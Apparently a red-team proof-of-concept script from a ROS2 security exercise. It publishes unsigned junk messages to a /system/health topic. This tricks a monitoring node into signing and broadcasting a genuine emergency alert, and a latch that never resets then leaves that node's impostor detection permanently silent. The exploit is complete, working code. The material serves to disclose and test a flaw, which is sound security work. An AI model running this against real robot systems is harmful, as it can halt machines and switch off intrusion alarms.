#!/usr/bin/env python3
"""攻擊 N13 — /system/health 未簽章反射放大 + N8 self-watch 永久致盲.

背景：藍方 N8 修補在 system_status_node 加了 self-watch：
    訂閱自己發的 /system/health，看到「不是自己發的」訊息就透過
    /security/alerts 廣播 🛑 [N8 防護] 警報。

漏洞（[system_status_node.py:136-141](../src/dds_security_monitor/dds_security_monitor/system_status_node.py#L136-L141)）：

    def _on_health_watch(self, msg):
        payload = verify_alert(msg.data, secret, expected_channel=CH_HEALTH, ...)
        if payload is None:
            # 收到無效簽章 = attacker raw publish → 立刻警報
            if not self._health_impostor_alerted:
                self._health_impostor_alerted = True       # ← latch，從不 reset
                self._alert_impostor('...impostor publisher')   # ← 簽 CH_ALERTS 發出去

    def _alert_impostor(self, reason):
        signed = sign_alert(text, self._alert_secret, channel=CH_ALERTS)  # ★ 用 secret 簽真 alert
        self._security_alert_pub.publish(msg)

兩個問題：

  (1) 反射放大：攻擊者「沒有 secret」也無法直接偽造 CH_ALERTS，
      但只要對 /system/health publish 一筆**未簽章垃圾 String**，
      就能誘使「持有 secret 的」system_status 替它簽出一筆真 CH_ALERTS alert
      → patrol / burger_env / mission_manager 全部收到合法警報 → 停車。
      破壞了系統核心不變式「只有 secret 持有者能觸發 emergency stop」。

  (2) latch 永久致盲：_health_impostor_alerted 設 True 後從不 reset。
      攻擊者搶先（在任何真 impostor 出現前）丟一筆垃圾 → latch 卡住 →
      self-watch 從此**對真正的 N8 impostor 視而不見**。
      一個未授權封包就關掉藍方整條 N8 防線。

本 PoC 兩段：
  Phase 1: publish 一筆 raw garbage 到 /system/health
           → 觀察 system_status 是否反射出 🛑 [N8 防護] 到 /security/alerts
  Phase 2: 再 publish 第二筆
           → 觀察 self-watch 是否已經啞掉（latch 致盲）
"""
import sys
import time
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class HealthReflectionAttacker(Node):

    def __init__(self):
        super().__init__('attacker_health_reflect')
        # 攻擊者只需要對 /system/health publish，不需要任何 secret
        self._pub = self.create_publisher(String, '/system/health', 10)
        self._n = 0
        self.create_timer(3.0, self._poke)
        self.get_logger().error(
            '☠️ N13: 對 /system/health publish 未簽章垃圾 — '
            '誘使 system_status 替我簽 CH_ALERTS alert'
        )

    def _poke(self):
        self._n += 1
        m = String()
        # 純垃圾 — 無 envelope、無 sig、無 channel。攻擊者沒有 secret。
        m.data = f'GARBAGE_no_signature_{self._n}_attacker_has_no_secret'
        self._pub.publish(m)
        self.get_logger().warn(
            f'  [poke #{self._n}] 丟未簽章垃圾到 /system/health: {m.data!r}'
        )


def main():
    rclpy.init()
    node = HealthReflectionAttacker()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 16.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error(f'⏹ 結束，共 poke {node._n} 次')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
